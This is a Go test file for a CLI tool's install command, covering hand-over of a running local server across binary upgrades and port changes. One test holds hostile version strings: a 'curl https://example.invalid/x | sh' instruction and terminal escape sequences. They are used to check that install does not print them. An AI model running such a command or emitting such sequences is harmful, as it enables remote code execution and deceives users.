package cli_test

import (
	"errors"
	"fmt"
	"net"
	"net/http"
	"os"
	"path/filepath"
	"runtime"
	"slices"
	"strconv"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/tidwall/gjson"

	"github.com/dsj7419/loadline/internal/cli"
	"github.com/dsj7419/loadline/internal/config"
	"github.com/dsj7419/loadline/internal/exetest"
	"github.com/dsj7419/loadline/internal/serverlock"
)

// fakeAt starts a fake on port, which must be free, as edit sets it up.
func fakeAt(t *testing.T, port int, edit ...func(*fakeLoadline)) *fakeLoadline {
	t.Helper()
	f := &fakeLoadline{t: t, version: "0.1.1", gone: make(chan struct{}), port: port}
	for _, e := range edit {
		e(f)
	}
	if f.process == nil {
		f.process = exetest.Start(t)
	}
	listener, err := (&net.ListenConfig{}).Listen(t.Context(), "tcp", net.JoinHostPort("127.0.0.1", strconv.Itoa(port)))
	if err != nil {
		t.Fatalf("listen on port %d: %v", port, err)
	}
	f.serve(listener)
	return f
}

// serverStarts records the servers install starts, in place of starting
// them.
type serverStarts struct {
	mu     sync.Mutex
	starts []string
}

// record notes a start of exe with args.
func (s *serverStarts) record(exe string, args ...string) {
	s.mu.Lock()
	defer s.mu.Unlock()
	s.starts = append(s.starts, strings.Join(append([]string{exe}, args...), " "))
}

func (s *serverStarts) started() []string {
	s.mu.Lock()
	defer s.mu.Unlock()
	return slices.Clone(s.starts)
}

// noStarts fails the test for any server install starts.
func noStarts(t *testing.T) *serverStarts {
	t.Helper()
	starts := &serverStarts{}
	cli.SetServerSpawn(t, func(exe string, args ...string) error {
		starts.record(exe, args...)
		t.Errorf("install started %s %q, want no server started", exe, args)
		return nil
	})
	return starts
}

// handOverHome is an installation in a sandbox whose config names the port
// of a fake running server, made as edit says, and that takes the
// installation's token unless edit says otherwise. Install runs as from a
// normal shell, whatever shell runs the test.
func handOverHome(t *testing.T, edit ...func(*fakeLoadline)) (home, dir string, fake *fakeLoadline) {
	t.Helper()
	cli.SetElevated(t, false)
	home, dir = sandbox(t, ownerSettings)
	fake = newFakeLoadline(t, append([]func(*fakeLoadline){ours(installToken(t, home))}, edit...)...)
	writeConfigPort(t, home, fake.port)
	return home, dir, fake
}

// The old server keeps running the binary it started from, and would never
// take up the new one while sessions keep it busy. Install asks it to stop,
// waits until its process is gone, and starts the binary it put in place.
func TestInstall_HandsARunningServerOverToTheNewBinary(t *testing.T) {
	setVersion(t, "0.1.1-test")
	home, dir, fake := handOverHome(t)
	starts := &serverStarts{}
	var newServer *fakeLoadline
	cli.SetServerSpawn(t, func(exe string, args ...string) error {
		starts.record(exe, args...)
		if !exited(t, fake.process.PID()) {
			t.Error("install started the new server while the old one's process still ran")
		}
		newServer = fakeAt(t, fake.port, func(f *fakeLoadline) { f.version = "0.1.1-test" })
		return nil
	})

	got := run(t, "install", "--config-dir", dir, "--yes")

	if got.code != 0 || got.stderr != "" {
		t.Fatalf("install = %d, stderr %q; want 0 and nothing", got.code, got.stderr)
	}
	want := "Restarted the Loadline server on 0.1.1-test; reload an open dashboard.\n" + restartNotice + "\n"
	if !strings.HasSuffix(got.stdout, want) {
		t.Errorf("stdout does not end with %q:\n%s", want, got.stdout)
	}
	if want := []string{filepath.FromSlash(installedExe(home)) + " serve --no-open"}; !slices.Equal(starts.started(), want) {
		t.Errorf("install started %q, want %q", starts.started(), want)
	}
	if n := fake.stopsAsked(); n != 1 {
		t.Errorf("the old server was asked to stop %d times, want once", n)
	}
	if newServer == nil || !newServer.answers() {
		t.Error("no server answers once install has returned")
	}
	if !gjson.Get(readSettings(t, dir), "hooks.SessionStart").Exists() {
		t.Error("the settings were not wired")
	}
}

// The server a hand-over starts may first wait out the lock on the history,
// which the server before it lets go of last, so install waits for it to
// answer at least as long as that wait and a server's start take together,
// and does not give up on a server that is on its way.
func TestInstall_WaitsForTheNewServerThroughItsWaitForTheLock(t *testing.T) {
	if got, least := cli.HandoverStartWait(), cli.LockWait+cli.ServerStartWait; got < least {
		t.Errorf("install waits %v for the server it hands over to, want at least %v: the %v it may wait for the lock and the %v of a start",
			got, least, cli.LockWait, cli.ServerStartWait)
	}
}

// A server started from an elevated shell would run elevated for as long as
// it lives, and it runs the claude of a config the user can write. Install
// stops the old one, and leaves the start to a normal shell.
func TestInstall_DoesNotStartAServerWhenElevated(t *testing.T) {
	_, dir, fake := handOverHome(t)
	cli.SetElevated(t, true)
	starts := noStarts(t)

	got := run(t, "install", "--config-dir", dir, "--yes")

	if got.code != 0 || got.stderr != "" {
		t.Fatalf("install = %d, stderr %q; want 0 and nothing", got.code, got.stderr)
	}
	if want := "Stopped the old server; run loadline open from a normal shell to start the new one.\n"; !strings.Contains(got.stdout, want) {
		t.Errorf("stdout lacks %q:\n%s", want, got.stdout)
	}
	if fake.answers() || !exited(t, fake.process.PID()) {
		t.Error("the old server still runs, want it stopped")
	}
	if len(starts.started()) != 0 {
		t.Errorf("install started %q", starts.started())
	}
}

// A server from 0.1.0 has no stop route. Install says how to end it once,
// and ends nothing itself.
func TestInstall_PrintsHowToStopAServerThatCannotBeAsked(t *testing.T) {
	_, dir, fake := handOverHome(t, earlier(http.StatusMethodNotAllowed))
	noStarts(t)

	got := run(t, "install", "--config-dir", dir, "--yes")

	if got.code != 0 || got.stderr != "" {
		t.Fatalf("install = %d, stderr %q; want 0 and nothing", got.code, got.stderr)
	}
	instruction := cli.OldServerInstruction(runtime.GOOS, fake.port)
	if !strings.Contains(got.stdout, instruction) {
		t.Errorf("stdout lacks the instruction %q:\n%s", instruction, got.stdout)
	}
	if !fake.answers() || exited(t, fake.process.PID()) {
		t.Error("the old server was ended, want it left running")
	}
}

func TestInstall_LeavesAServerOfAnotherInstallationAlone(t *testing.T) {
	_, dir, fake := handOverHome(t, ours(tokenFor(2)))
	noStarts(t)

	got := run(t, "install", "--config-dir", dir, "--yes")

	if got.code != 0 || got.stderr != "" {
		t.Fatalf("install = %d, stderr %q; want 0 and nothing", got.code, got.stderr)
	}
	want := fmt.Sprintf("Note: the server on port %d did not take this installation's token: it belongs to another installation, and was left running.\n", fake.port)
	if !strings.Contains(got.stdout, want) {
		t.Errorf("stdout lacks %q:\n%s", want, got.stdout)
	}
	if !fake.answers() || exited(t, fake.process.PID()) {
		t.Error("the other installation's server was stopped, want it left running")
	}
}

// Windows may refuse to let the old server's process be watched. Once that
// server is silent, the new one is started all the same: it waits for the
// old one to let go of the history.
func TestInstall_HandsOverAServerWhoseProcessCannotBeWatched(t *testing.T) {
	cli.CannotWatchProcesses(t)
	_, dir, fake := handOverHome(t, func(f *fakeLoadline) { f.keepsProcess = true })
	starts := &serverStarts{}
	cli.SetServerSpawn(t, func(exe string, args ...string) error {
		starts.record(exe, args...)
		fakeAt(t, fake.port)
		return nil
	})

	got := run(t, "install", "--config-dir", dir, "--yes")

	if got.code != 0 || got.stderr != "" || !strings.Contains(got.stdout, "Restarted the Loadline server on ") {
		t.Errorf("install = %d, stdout %q, stderr %q; want 0 and the server restarted", got.code, got.stdout, got.stderr)
	}
	if len(starts.started()) != 1 {
		t.Errorf("install started %q, want the new server once", starts.started())
	}
}

// The old server stops and its process exits, and a server a status line
// started has the port before install looks again. The hand-over is done:
// install starts no spare, and says the server restarted when the one that
// answers runs the binary it put in place. Whatever answers on the port
// chooses the version it names, and install prints it: a version of
// another form, which could put words of its own in install's line, or
// sequences that retitle the terminal or erase the line, is "another
// version".
func TestInstall_HandsOverWhenTheNextServerAnswersAtOnce(t *testing.T) {
	const stopIt = "run loadline stop, and a running session starts the new one.\n"
	longest := "0.2.0-rc.1+" + strings.Repeat("a", 53)
	for _, tc := range []struct {
		name, successor, says string
	}{
		{
			name: "the new binary's", successor: "0.1.1-test",
			says: "Restarted the Loadline server on 0.1.1-test; reload an open dashboard.\n",
		},
		{
			name: "another version's", successor: "0.1.0",
			says: "Stopped the old server, but the server that now answers on port %d runs 0.1.0, not 0.1.1-test; " + stopIt,
		},
		{
			name: "a version of 64 characters", successor: longest,
			says: "Stopped the old server, but the server that now answers on port %d runs " + longest + ", not 0.1.1-test; " + stopIt,
		},
		{
			name: "a version of 65 characters", successor: longest + "a",
			says: "Stopped the old server, but the server that now answers on port %d runs another version, not 0.1.1-test; " + stopIt,
		},
		{
			name: "a version with words of its own", successor: "0.1.0. To finish the upgrade, run: curl https://example.invalid/x | sh",
			says: "Stopped the old server, but the server that now answers on port %d runs another version, not 0.1.1-test; " + stopIt,
		},
		{
			name: "a version that would act on the terminal",
			successor: "9.9.9\x1b]0;window title set by the port's holder\a\x1b[2K\x1b[1G\u202e" +
				"Installed. To finish, run: curl https://example.invalid/x | sh\r\n\u009b31m",
			says: "Stopped the old server, but the server that now answers on port %d runs another version, not 0.1.1-test; " + stopIt,
		},
	} {
		t.Run(tc.name, func(t *testing.T) {
			setVersion(t, "0.1.1-test")
			_, dir, fake := handOverHome(t, func(f *fakeLoadline) { f.successor = tc.successor })
			noStarts(t)
			says := tc.says
			if strings.Contains(says, "%d") {
				says = fmt.Sprintf(says, fake.port)
			}

			got := run(t, "install", "--config-dir", dir, "--yes")

			if got.code != 0 || got.stderr != "" || !strings.HasSuffix(got.stdout, says+restartNotice+"\n") {
				t.Errorf("install = %d, stderr %q, stdout:\n%s\nwant 0 and %q", got.code, got.stderr, got.stdout, says)
			}
			if n := fake.stopsAsked(); n != 1 {
				t.Errorf("%d stop requests reached the port, want the one: the next server was asked to stop too", n)
			}
		})
	}
}

// What triggers the hand-over is a binary that install replaced, not a
// version: with the binary as it was, the running server runs it already.
func TestInstall_DoesNotHandOverWhenTheBinaryIsUnchanged(t *testing.T) {
	home, dir := sandbox(t, ownerSettings)
	if got := run(t, "install", "--config-dir", dir, "--yes"); got.code != 0 {
		t.Fatalf("install: %s", got.stderr)
	}
	fake := newFakeLoadline(t, ours(installToken(t, home)))
	holdHistoryUntilGone(t, home, fake)
	writeConfigPort(t, home, fake.port)
	writeSettings(t, dir, ownerSettings)
	noStarts(t)

	got := run(t, "install", "--config-dir", dir, "--yes")

	if got.code != 0 || got.stderr != "" || !gjson.Get(readSettings(t, dir), "hooks.SessionStart").Exists() {
		t.Fatalf("install = %d, stderr %q; want 0, nothing, and the settings wired again", got.code, got.stderr)
	}
	if n := fake.stopsAsked(); n != 0 {
		t.Errorf("the server was asked to stop %d times, want never", n)
	}
	if strings.Contains(got.stdout, "Restarted") {
		t.Errorf("stdout says the server restarted:\n%s", got.stdout)
	}
}

// holdHistoryUntilGone holds the history's lock of the installation in home
// for fake, recorded as fake's on its configured port, as a running server
// holds it, and lets go of it once fake has stopped.
func holdHistoryUntilGone(t *testing.T, home string, fake *fakeLoadline) {
	t.Helper()
	holdHistoryFor(t, home, fake, serverlock.Holder{Port: fake.port, PID: fake.process.PID()})
}

// holdHistoryGivenPort is holdHistoryUntilGone for a server that was given
// its port, as serve --port gives it.
func holdHistoryGivenPort(t *testing.T, home string, fake *fakeLoadline) {
	t.Helper()
	holdHistoryFor(t, home, fake, serverlock.Holder{Port: fake.port, PID: fake.process.PID(), PortGiven: true})
}

// holdHistoryFor holds the history's lock of the installation in home,
// recorded as holder, until fake has stopped.
func holdHistoryFor(t *testing.T, home string, fake *fakeLoadline, holder serverlock.Holder) {
	t.Helper()
	lock, err := serverlock.Acquire(filepath.Join(home, "server.lock"), 0, nil)
	if err != nil {
		t.Fatalf("Acquire: %v", err)
	}
	if err := lock.Record(holder); err != nil {
		t.Fatalf("Record: %v", err)
	}
	letGo := sync.OnceFunc(func() { _ = lock.Release() })
	t.Cleanup(letGo)
	go func() {
		select {
		case <-fake.gone:
			letGo()
		case <-t.Context().Done():
		}
	}()
}

// The README has the user set another port in the config and run install
// again. The server on the old port holds the history for as long as a
// session keeps it busy, and with it no server can start on the new port:
// install hands it over as it does a server whose binary it replaced, with
// the installation's token and never by ending a process, and starts the
// server on the configured port.
func TestInstall_HandsTheServerOnTheOldPortOverWhenThePortChanges(t *testing.T) {
	// portChanged installs, starts a server on a port of its own, as the
	// old configured port, that holds the history, made as edit says, and
	// then names another port in the config, which it returns.
	portChanged := func(t *testing.T, edit ...func(*fakeLoadline)) (home, dir string, old *fakeLoadline, port int) {
		t.Helper()
		setVersion(t, "0.1.1-test")
		cli.SetElevated(t, false)
		home, dir = sandbox(t, ownerSettings)
		if got := run(t, "install", "--config-dir", dir, "--yes"); got.code != 0 {
			t.Fatalf("the first install: %s", got.stderr)
		}
		old = newFakeLoadline(t, append([]func(*fakeLoadline){ours(installToken(t, home))}, edit...)...)
		holdHistoryUntilGone(t, home, old)
		port = freePort(t)
		writeConfigPort(t, home, port)
		return home, dir, old, port
	}

	t.Run("from a normal shell", func(t *testing.T) {
		home, dir, old, port := portChanged(t)
		starts := &serverStarts{}
		cli.SetServerSpawn(t, func(exe string, args ...string) error {
			starts.record(exe, args...)
			if !exited(t, old.process.PID()) {
				t.Error("install started the new server while the old one's process still ran")
			}
			fakeAt(t, port, func(f *fakeLoadline) { f.version = "0.1.1-test" })
			return nil
		})

		got := run(t, "install", "--config-dir", dir, "--yes")

		want := fmt.Sprintf("Moved the Loadline server from port %d to port %d; run loadline open to see its dashboard.\n", old.port, port)
		if got.code != 0 || got.stderr != "" || !strings.HasSuffix(got.stdout, want+restartNotice+"\n") {
			t.Errorf("install = %d, stderr %q, stdout:\n%s\nwant 0 and %q", got.code, got.stderr, got.stdout, want)
		}
		if n := old.stopsAsked(); n != 1 {
			t.Errorf("the old port's server was asked to stop %d times, want once", n)
		}
		if want := []string{filepath.FromSlash(installedExe(home)) + " serve --no-open"}; !slices.Equal(starts.started(), want) {
			t.Errorf("install started %q, want %q", starts.started(), want)
		}
	})

	t.Run("elevated", func(t *testing.T) {
		_, dir, old, _ := portChanged(t)
		cli.SetElevated(t, true)
		noStarts(t)

		got := run(t, "install", "--config-dir", dir, "--yes")

		if want := "Stopped the old server; run loadline open from a normal shell to start the new one.\n"; got.code != 0 || !strings.Contains(got.stdout, want) {
			t.Errorf("install = %d, stderr %q, stdout:\n%s\nwant 0 and %q", got.code, got.stderr, got.stdout, want)
		}
		if old.answers() || !exited(t, old.process.PID()) {
			t.Error("the old port's server still runs, want it stopped")
		}
	})

	// The token is the installation's: a server that refuses it was started
	// with another, and is left as a server of another installation is.
	t.Run("a server that refuses the token", func(t *testing.T) {
		_, dir, old, _ := portChanged(t, ours(tokenFor(2)))
		noStarts(t)

		got := run(t, "install", "--config-dir", dir, "--yes")

		want := fmt.Sprintf("Note: the server on port %d did not take this installation's token: it belongs to another installation, and was left running.\n", old.port)
		if got.code != 0 || got.stderr != "" || !strings.Contains(got.stdout, want) {
			t.Errorf("install = %d, stderr %q, stdout:\n%s\nwant 0 and %q", got.code, got.stderr, got.stdout, want)
		}
		if !old.answers() || exited(t, old.process.PID()) {
			t.Error("the old port's server was stopped, want it left running")
		}
	})
}

// ownTelemetrySettings are settings whose OpenTelemetry setup is the user's
// own, which install leaves alone: nothing in them names the port.
const ownTelemetrySettings = `{
  "env": {
    "CLAUDE_CODE_ENABLE_TELEMETRY": "1",
    "OTEL_LOGS_EXPORTER": "otlp",
    "OTEL_EXPORTER_OTLP_LOGS_ENDPOINT": "http://collector.example:4318/v1/logs"
  }
}`

// A port change gives install nothing to write when nothing in the settings
// names the port, as when the OpenTelemetry setup is the user's own. Run
// again, as the README says, install still moves the server from the old
// port, which no server on the new one can start beside.
func TestInstall_MovesTheServerAfterAPortChangeWhateverTheSettingsHold(t *testing.T) {
	for name, settings := range map[string]string{
		"telemetry is Loadline's": ownerSettings,
		"telemetry is the user's": ownTelemetrySettings,
	} {
		t.Run(name, func(t *testing.T) {
			setVersion(t, "0.1.1-test")
			cli.SetElevated(t, false)
			home, dir := sandbox(t, settings)
			if got := run(t, "install", "--config-dir", dir, "--yes"); got.code != 0 {
				t.Fatalf("the first install: %s", got.stderr)
			}
			old := newFakeLoadline(t, ours(installToken(t, home)))
			holdHistoryUntilGone(t, home, old)
			port := freePort(t)
			writeConfigPort(t, home, port)
			cli.SetServerSpawn(t, func(string, ...string) error {
				fakeAt(t, port, func(f *fakeLoadline) { f.version = "0.1.1-test" })
				return nil
			})

			got := run(t, "install", "--config-dir", dir, "--yes")

			want := fmt.Sprintf("Moved the Loadline server from port %d to port %d; run loadline open to see its dashboard.\n", old.port, port)
			if got.code != 0 || !strings.Contains(got.stdout, want) {
				t.Errorf("install = %d, stderr %q, stdout:\n%s\nwant 0 and %q", got.code, got.stderr, got.stdout, want)
			}
			if n := old.stopsAsked(); n != 1 {
				t.Errorf("the old port's server was asked to stop %d times, want once", n)
			}
		})
	}
}

// By the time the hand-over fails, the settings and the binary are in
// place: install says what happened and what to run, and exits 1.
func TestInstall_SaysWhatToDoWhenTheHandOverFails(t *testing.T) {
	for _, tc := range []struct {
		name  string
		edit  func(*fakeLoadline)
		spawn func(string, ...string) error
		says  string
	}{
		{
			name: "the old server runs on",
			edit: func(f *fakeLoadline) { f.keepsProcess = true },
			says: "still runs after 100ms; once it has stopped, run loadline open\n",
		},
		{
			name: "the old server fails the request",
			edit: func(f *fakeLoadline) { f.refuse = http.StatusInternalServerError },
			says: "500 Internal Server Error; run loadline open\n",
		},
		{
			name:  "the new server does not start",
			edit:  func(*fakeLoadline) {},
			spawn: func(string, ...string) error { return errors.New("no such file") },
			says:  "the old server stopped, but the new one did not start: start the server: no such file; run loadline open\n",
		},
		{
			name:  "the new server does not answer",
			edit:  func(*fakeLoadline) {},
			spawn: func(string, ...string) error { return nil },
			says:  "the old server stopped, but the new one did not start: the server started on port %d did not answer within 100ms; run loadline open\n",
		},
	} {
		t.Run(tc.name, func(t *testing.T) {
			cli.SetStopWait(t, 100*time.Millisecond)
			cli.SetHandoverStartWait(t, 100*time.Millisecond)
			home, dir, fake := handOverHome(t, tc.edit)
			says := tc.says
			if strings.Contains(says, "%d") {
				says = fmt.Sprintf(says, fake.port)
			}
			if tc.spawn != nil {
				cli.SetServerSpawn(t, tc.spawn)
			} else {
				noStarts(t)
			}

			got := run(t, "install", "--config-dir", dir, "--yes")

			if got.code != 1 || !strings.HasPrefix(got.stderr, "loadline: ") || !strings.HasSuffix(got.stderr, says) ||
				strings.Count(got.stderr, "run loadline") != 1 {
				t.Errorf("install = %d, stderr %q; want 1 and an error that ends %q, with that one hint", got.code, got.stderr, says)
			}
			if !strings.HasSuffix(got.stdout, restartNotice+"\n") {
				t.Errorf("stdout does not end with the restart notice:\n%s", got.stdout)
			}
			if _, err := os.Stat(filepath.FromSlash(installedExe(home))); err != nil || !gjson.Get(readSettings(t, dir), "hooks.SessionStart").Exists() {
				t.Errorf("the settings or the binary are not in place (%v)", err)
			}
		})
	}
}

// A server the user started with serve --port runs on the port they chose,
// often because the configured one cannot take a server, as Loadline's own
// refusal of a taken port advises. Install cannot tell whether a server can
// start on the configured port now, so it leaves that one where it is,
// whether or not it has anything to write, and says how to stop it.
func TestInstall_LeavesAServerStartedWithServePortWhereItIs(t *testing.T) {
	for _, tc := range []struct {
		name string
		// rewrite gives install something to write.
		rewrite bool
		// taken has another program on the configured port.
		taken bool
	}{
		{name: "nothing to write, the configured port free"},
		{name: "nothing to write, the configured port another program's", taken: true},
		{name: "something to write, the configured port another program's", rewrite: true, taken: true},
	} {
		t.Run(tc.name, func(t *testing.T) {
			setVersion(t, "0.1.1-test")
			cli.SetElevated(t, false)
			home, dir := sandbox(t, ownerSettings)
			if got := run(t, "install", "--config-dir", dir, "--yes"); got.code != 0 {
				t.Fatalf("the first install: %s", got.stderr)
			}
			cfg, err := config.Load(filepath.Join(home, "config.json"), home)
			if err != nil {
				t.Fatal(err)
			}
			if tc.taken {
				listener, err := (&net.ListenConfig{}).Listen(t.Context(), "tcp", net.JoinHostPort("127.0.0.1", strconv.Itoa(cfg.Port)))
				if err != nil {
					t.Fatalf("listen on the configured port: %v", err)
				}
				other := &http.Server{Handler: http.NotFoundHandler(), ReadHeaderTimeout: hangBound}
				go func() { _ = other.Serve(listener) }()
				t.Cleanup(func() { _ = other.Close() })
			}
			if tc.rewrite {
				writeSettings(t, dir, ownerSettings)
			}
			chosen := newFakeLoadline(t, ours(installToken(t, home)))
			holdHistoryGivenPort(t, home, chosen)
			noStarts(t)

			got := run(t, "install", "--config-dir", dir, "--yes")

			note := fmt.Sprintf("Note: the Loadline server on port %d was started with serve --port, and was left running; "+
				"while it runs, no server starts on the configured port %d. Stop it with loadline stop --port %d to let one start there.\n",
				chosen.port, cfg.Port, chosen.port)
			if got.code != 0 || got.stderr != "" || strings.Count(got.stdout, note) != 1 {
				t.Errorf("install = %d, stderr %q, stdout:\n%s\nwant 0 and, once, %q", got.code, got.stderr, got.stdout, note)
			}
			if n := chosen.stopsAsked(); n != 0 || !chosen.answers() || exited(t, chosen.process.PID()) {
				t.Errorf("the server started with serve --port was asked to stop %d times, or no longer runs; want it left running", n)
			}
		})
	}
}
